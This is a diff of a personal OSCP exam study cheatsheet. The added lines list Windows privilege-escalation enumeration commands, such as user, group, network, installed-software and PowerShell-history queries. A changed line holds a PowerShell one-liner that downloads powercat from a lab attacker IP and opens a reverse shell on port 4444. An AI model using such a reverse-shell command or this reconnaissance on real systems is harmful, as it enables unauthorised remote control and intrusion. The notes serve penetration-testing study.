@@ -1,6 +1,15 @@
 # OSCP-Notes
 Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
 
+Things that we should look for on a system:
+    - Username and hostname
+    - Group memberships of the current user
+    - Existing users and groups
+    - Operating system, version and architecture
+    - Network information
+    - Installed applications
+    - Running processes
+
 
 Transfer File From Windows To Linux via ssh:
     1.on linux 2. on windows:
@@ -86,8 +95,36 @@ Execution Policy on Windows:
         
 Download and execute in PowerShell:
 
-    IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
 
+Windows Privesc:
+    Enum:
+        Users and Groups:
+        
+            whoami
+            whoami /groups
+            Get-LocalUser (In PS)
+            net user <username>
+            Get-LocalGroup
+            Get-LocalGroupMember <groupname>
+        System:
+            systeminfo
+        Network:
+            ipconfig /all
+            route print
+            netstat -ano (active TCP connections and ports)
+        Installed Apps:
+            Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+            Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+        Running Processes:
+            Get-Process
+
+        Search for files:
+            Get-ChildItem -Path C:\ -Include *.<file.extention> -File -Recurse -ErrorAction SilentlyContinue
+
+        Commands Executed by user:
+            Get-History
+            (Get-PSReadlineOption).HistorySavePath
 
 Password Shit:
         Hydra:
